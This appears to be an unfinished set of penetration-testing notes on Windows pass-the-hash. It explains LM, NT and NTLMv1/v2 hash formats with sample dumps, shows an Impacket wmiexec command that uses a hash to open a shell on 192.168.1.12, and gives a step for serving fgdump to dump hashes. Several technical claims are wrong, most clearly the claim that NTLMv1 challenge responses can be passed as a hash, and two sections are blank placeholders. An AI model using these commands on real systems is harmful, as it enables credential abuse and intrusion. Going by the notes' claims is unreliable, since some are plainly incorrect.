# Pass-The-Hash Windows

In most case of leathral movment, we usually don't have password. 
This technique, allows us to authenticate to a remote target by using a valid username and NTLM/LM hash rather than username and password. First let's understand the diffrences between LM,NTLM and NTLMv1/v2 hashes:

## Lan Manager (LM) Hashes

The oldest password storage used by Windows. In Windows 2000, XP and Server 2003 passwords shorter than 15 characters were stored in the Lan Manager (LM) hash format as following:

```
user:group:id:lmhash:nthash::
```

For example:

```
 Admin:502:aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3:::
```

This hash divided by semicolon, means:

- Admin is the user name

- 502 is the relative identifier (500 is an administrator, 502 here is a kerberos account. (adsecurity.org/?p=483)

- aad3c435b514a4eeaad3b935b51304f is the LM hash

- c46b9e588fa0d112de6f59fd6d58eae3 is the NT hash 


Our final NTLM hash for brute force attack will be *aad3c435b514a4eeaad3b935b51304fe*

## NT (New Technology) Hashes

In newer Windows versions (such as Vista, Server 2008+, Win7 etc.) this is the way passwords are stored, also those hashes are stored on domain controllers in the NTDS file and commonly use for pass-the-hash. This commonly use in term of NTLM hash (or just NTLM).

NTLM hash with only the NT component format as following:

```
user:group:id:emptylmhash:nthash::
```

For example:

```
Administrator:500:NO PASSWORD*********************:EC054D40119570A46634350291AF0F72:::
ITguy:1007:AAD3B435B51404EEAAD3B435B51404EE:38103E9BF8D09200D725F1541ECC5BCA:::
```

In both cases, it is the same format. However, the string "NO PASSWORD" or "AAD3B435B51404EEAAD3B435B51404EE" display in place of no password depend on the tool being used to dump those hashes as normally LM hash is empty and not stored. NTLM hash can be cracked to gain password, or used to pass-the-hash.

## NTLMv1/v2

Those NTLMv1/v2 are challenge response protocols used for authentication in Windows environments, much harder to bruteforce and usually used in SMB relay attack using Responder.py or Impacket Python tools to obtains this hash from a client in the network.

NTLMv1-SSP hash format as following:

```
username::hostname:*response*:*response*:challenge
```

For example:

```
john::MWLAB:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
```

We will use the response characters from the hash string as our final hash for pass-the-hash:

```
38d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41
```

Then, use this hash on one of pth (pass-the-hash) tools for example wmiexec from Impacket:

```
root@kali:~# wmiexec.py  -hashes 38d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41 administrator@192.168.1.12
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

## Dump Hashes

Dump hashes from running system using fgdump.exe from Kali as following:

```
root@kali:~# cd /usr/share/windows-binaries/fgdump;
root@kali:/usr/share/windows-binaries/fgdump# python -m SimpleHTTPServer 80
```

Or by using powershell script to dump hashes from memory:

```
[TBD]

```

## Practical Usage PTH

TBD...


